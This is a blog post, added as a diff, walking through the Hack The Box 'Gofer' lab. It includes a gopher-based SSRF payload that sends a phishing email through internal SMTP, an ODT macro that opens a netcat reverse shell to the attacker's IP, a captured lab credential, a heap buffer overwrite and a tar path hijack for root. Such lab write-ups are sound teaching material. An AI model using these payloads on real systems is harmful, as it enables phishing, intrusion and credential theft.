@@ -1,0 +1,401 @@
+---
+layout: post
+title: HTB Gofer
+description: A writeup for Gofer
+image: htb/gofer/gopher.jpg
+---
+
+### Intro
+Hey. It's been a while. Here's a post. Trying to mix things up a bit with a ctf writeup. It's heavy on screenshots and if you notice any anachronisms it's because the screenshots are from the future. Just kidding. I went back and forth to get more for illustration.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/Gofer.png" /></p>
+
+### Recon
+Let's start with a simple scan:
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/nmap.png" /></p>
+First, we can see port 80 which is associated with domain name *gofer.htb*. Let's put that in our `/etc/hosts` file later. Second Samba is also available, noticeably with a version vulnerable to Sambacry. Looks like low-hanging fruit and I did make an attempt just to make sure. As this is a "Hard" box, doors won't easily open. Finally there's port 25 which is filtered and `ssh` which will come into play later on.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/gofer_site.png" /></p>
+As usual of HTB fare, it's a webapp. It's quite minimal which tells us we don't need to spend much time gawking at its design. I did go through any functionality that might be of interest. There's the map and message box. But the message box was broken (ie no target for the form action) and I already know where I am.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/the team.png" /></p>
+
+There's info about the fictional employees though. That will come in handy later on.
+
+#### Samba
+What's in the smb shares? Well there's a folder named `shares`. Quite prosaic.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/samba1.png" /></p>
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/samba2.png" /></p>
+
+Some mail is backed up. Going through it, we'll find the setup for this challenge:
+
+```
+From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
+Return-Path: <jdavis@gofer.htb>
+X-Original-To: tbuckley@gofer.htb
+Delivered-To: tbuckley@gofer.htb
+Received: from gofer.htb (localhost [127.0.0.1])
+        by gofer.htb (Postfix) with SMTP id C8F7461827
+        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
+Subject:Important to read!
+Message-Id: <20221028192857.C8F7461827@gofer.htb>
+Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
+From: jdavis@gofer.htb
+
+Hello guys,
+
+Our dear Jocelyn received another phishing attempt last week and his 
+habit of clicking on links without paying much attention may be 
+problematic one day. That's why from now on, I've decided that 
+important documents will only be sent internally, by mail, which 
+should greatly limit the risks. If possible, use an .odt format, 
+as documents saved in Office Word are not always well interpreted 
+by Libreoffice.
+
+PS: Last thing for Tom; I know you're working on our web proxy 
+but if you could restrict access, it will be more secure until 
+you have finished it. It seems to me that it should be possible 
+to do so via <Limit>
+```
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/jocelyn.png" /></p>
+<p align="center"><em>A security threat.</em></p>
+Seems like someone is skipping their cyber awareness training. She(or he?) will lend us a helping hand gaining a foothold. Let's craft that `.odt` document!
+
+### ODT Macros
+There are guides like [this](https://dominicbreuker.com/post/htb_re/){:target="_blank"} one and [this](https://wiki.openoffice.org/wiki/Documentation/OOoAuthors_User_Manual/Getting_Started/Creating_a_simple_macro){:target="_blank"} one for this part.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/macro1.png" /></p>
+With the document prepared, I sent the email to Jocelyn. The mail address `jhudson@gofer.htb` was easy enough to guess as it takes after the other known email addresses (e.g. `jdavis@gofer.htb`).
+The command to send is:
+```
+mutt -s "Hello Jocelyn!" -a test.odt -- jhudson@gofer.htb
+```
+But you can't send emails. Remember, port 25 is filtered.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/mail.png" /></p>
+Well that sucks. Now what?
+
+### Recon pt. 2
+We're going to make use of a hackers' most powerful recon tool in his arsenal:
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/htb_forums.png" /></p>
+Nah, no begging. Let' go back to the email. There's supposedly a proxy in the works, but where is it? That's what we need to find right now. Let's fire up our discovery tools.
+```
+wfuzz -Z -w /home/jerowin/Documents/htb/Machines/dynstr/subdomains-top1million-
+110000.txt --hc 400,404 -u http://gofer.htb/ -H "Host: FUZZ.gofer.htb" --hl 9
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://gofer.htb/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+=====================================================================
+
+000000084:   401        14 L     54 W       462 Ch      "proxy"                                                                                                                      
+
+Total time: 161.1278
+Processed Requests: 114441
+Filtered Requests: 114440
+Requests/sec.: 710.2496
+```
+The first rounds of discovery didn't turn up much. No additional paths were discovered so we need to see if there are subdomains. For this part, be mindful of the `/etc/hosts` file. Only domains associated with the target IP will be resolved. Since we don't know the subdomain yet, we need to use a technique to check. Fortunately we can fuzz through the `Host` header. We hit a subdomain named `proxy`.
+
+Okay, we avoided defeat this time. But we're not yet out of the woods. Notice that our fuzz returned `HTTP 401`. That's not good. We're locked out and this was our only lead up until recently. Being a proxy, there might be a way to probe it deeper, but how? For that we'll need to fuzz further:
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/fuzz2.png" /></p>
+After several rounds of fuzzing I was somewhat ready to call it a day but then I noticed something interesting. There are some methods not implemented. That could be an interesting venture. What if we paired it with path/file discovery?
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/fuzz.png" /></p>
+Wow, we actually found something. Turns out there are some specific methods not implemented. But any other method will do:
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/fuzz3.png" /></p>
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/fuzz4.png" /></p>
+<p align="center"><em>If you're wondering, no this is not a reskinned burpsuite. Check out <a href="https://caido.io" target="_blank">caido</a> which is sublime for burp I guess?</em></p>
+
+Turns out I can substitute any method name as long as it is not `TRACE` or `CONNECT`. We found our next entry point `index.php`! And it seems to require a `URL` parameter. What if we were a bit naughty with this parameter?
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/rfi1.png" /></p>
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/rfi2.png" /></p>
+
+Cool, we got ourselves SSRF. But this is Gofer right? There must be some sense to this challenge with that kind of name. So we'll need to make use of SSRF w/ gopher protocol.
+
+### SSRF w/ gopher
+Looking at [this](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery){:target="_blank"}, there's something we can try which is a synthesis of details we've gathered:
+* The machine name
+* Email is only available internally, as evidenced by port 25 being filtered and the backed up email
+* Someone who likes to click links from emails
+* Support for ODT documents via Libreoffice.
+
+So our plan of attack may look something like this
+
+1. Create an ODT document w/ a malicious macro (Done)
+2. Edit the macro to create a reverse shell to a netcat listener
+3. Serve the document via http server (Done)
+4. Trigger SSRF via the Proxy + gopher protocol
+5. Target the SMTP service to mail Jocelyn a link to our ODT document.
+
+We will use this macro:
+```
+REM  *****  BASIC  *****
+
+Sub Main
+	Shell("nc 10.10.14.114 4444 -e sh")
+End Sub
+```
+
+After the change, we need to craft the SSRF payload to talk with the SMTP server. Let's see how this can be done. We need to check if gopher is actually available:
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/ssrf1.png" /></p>
+Looks like there's a blacklist in place. Fortunately, there are countless ways for us to try and overcome this (check out this [guide](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-filters){:target="_blank"}). Here is a payload we can try
+```
+TEST /index.php?url=gopher://2130706433:25/xHELO%20gofer.htb%250d%250a
+MAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@
+gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker
+@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate
+%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject
+%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20
+magic%20word%20%21%20<a+href%3d'http%3a//10.10.14.114:8000/test.odt>
+this</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+```
+
+For legibility let's decode it.:
+```
+gopher://2130706433:25 # 127.0.0.1 converted to decimal.
+		       # Don't worry, it's RFC compliant!
+/xHELO gofer.htb%0d%0a # SMTP commands to send the email
+MAIL FROM:<hacker@site.com>%0d%0a
+RCPT TO:<jhudson@gofer.htb>%0d%0a # Our target's mail address
+DATA%0d%0a
+From: [Hacker] <hacker@site.com>%0d%0a
+To: <jhudson@gofer.htb>%0d%0a
+Date: Tue, 15 Sep 2017 17:20:26 -0400%0d%0a
+Subject: AH AH AH%0d%0a
+%0d%0a
+You didn't say the magic word ! <a href='http://10.10.
+14.114:8000/test.odt'>this</a>%0d%0a # A hyperlink via HTML
+%0d%0a%0d%0a.%0d%0a
+QUIT%0d%0a
+```
+
+Remember Jocelyn likes links so we included a link to our ODT document. If everything was written just right, sending this payload will trigger the SSRF:
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/ssrf2.png" /></p>
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/ssrf3.png" /></p>
+
+Okay I didn't just show you the same screenshot twice, notice that we obtained a shell. Great.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/flag1.png" /></p>
+
+### The Route to Root
+Sorry for the pun. Couldn't help myself. Anyway.
+Now that we have a foothold, we need to make ourselves root. Let's do some more recon:
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/stickybits.png" /></p>
+A good escalation point would be to look at the available files with SUID. After a quick look around we have some files with sticky bits.
+What stands out the most is the `notes` binary that can only be executed by `root` or someone from `dev`.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/groups.png" /></p>
+
+Currently we are not in the same group as Tom who is from `dev`. We're in `netdev` otherwise known as the "the hacker's wet dream" department.
+Anyway, we'll need to access the `dev` group somehow, but how?
+Looking around, we have access to the credentials for the proxy earlier. Maybe we can crack it?
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/htpasswd.png" /></p>
+Nah, crack that. No easy wins for challenges like these. Let's probe further.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/traffic.png" /></p>
+
+We can see a lot of traffic coming in for HTTP. Curiously though, we can see some being made internally from `127.0.0.1`.
+Running linpeas, we'll get some interesting info. We can use `tcpdump`.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/linpeas1.png" /></p>
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/linpeas2.png" /></p>
+```
+tcpdump -i lo -A
+```
+
+Seemed like a longshot to be honest. When you run `linpeas`, you know you're out of options by that point. But then again it's prudent to use tools when covering bases.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/tcpdump.png" /></p>
+At first glance, I thought this came from people trying to bruteforce the proxy. But then again I am sniffing the loopback interface so this clearly came from inside. When we decode the creds, we get Tom's creds!
+```
+rax2 -D dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=
+tbuckley:ooP4dietie3o_hquaeti
+```
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/ssh.png" /></p>
+When you crack the creds from htpasswd, `hashcat -m 1600 hash decoded`, you'll get the same creds.
+All that's left is to leverage the `notes` binary.
+
+### Lazy RE
+I usually use a disassembler/debugger for this part but decided against it. The binary was easy to understand by simply playing around with it.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/notes1.png" /></p>
+This binary basically just creates users and notes that only exist while it's running. A user is given the `user` role by default. Option 8 is reserved only for users in the `admin` role. But there is no option to switch/assign/create this role.
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/notes2.png" /></p>
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/notes3.png" /></p>
+Looking at the strings output we can see certain lengths for username and notes, 23 and 39 respectively.
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/notes_strings.png" /></p>
+Interestingly, we can see `tar -czvf /root/backups/backup_notes.tar.gz /opt/notes` which can be hijacked. But by default this is only reachable via Option 8. This is the puzzle we must solve.
+
+Let's produce some patterns:
+```
+ragg2 -P 24 -r
+```
+If we try exceeding the buffer with our input, we can observe the `Role` buffer was modified.
+```
+tbuckley@gofer:~$ notes
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 1
+
+Choose an username: test
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 2
+
+
+Username: test
+Role: user
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 4
+
+Write your note:
+test
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 3
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 2
+
+
+Username: 
+Role: user
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 4
+
+Write your note:
+AAABAACAADAAEAAFAAGAAHAA
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 2
+
+
+Username: AAABAACAADAAEAAFAAGAAHAA
+Role: 
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 
+```
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/notes4.png" /></p>
+We can observe the following:
+* Creating a user will create two buffers, `user` and `role`
+* Deleting the user will release the `user` buffer but not the `role` buffer
+* Writing a `note` that exceeds the buffer length will affect the `role` buffer.
+
+Given these observations, we can try to overwrite the `role` buffer with the value `admin` after the `user` buffer is released by writing a a large enough note:
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/notes5.png" /></p>
+Looks like that worked. Having overwritten the buffer, we have essentially escalated our privileges and gained the ability to backup notes. But we don't really want to backup silly notes. We want the root flag. Let's create a tar file and have it execute instead of the actual `tar` file:
+```
+//tar file contents
+
+#!/bin/bash
+bash -i
+```
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/suid_exploit.png" /></p>
+After that, all that's left is to get the flag:
+
+<p align="center"><img src="{{ site.url }}/assets/img/htb/gofer/root_flag.png" /></p>
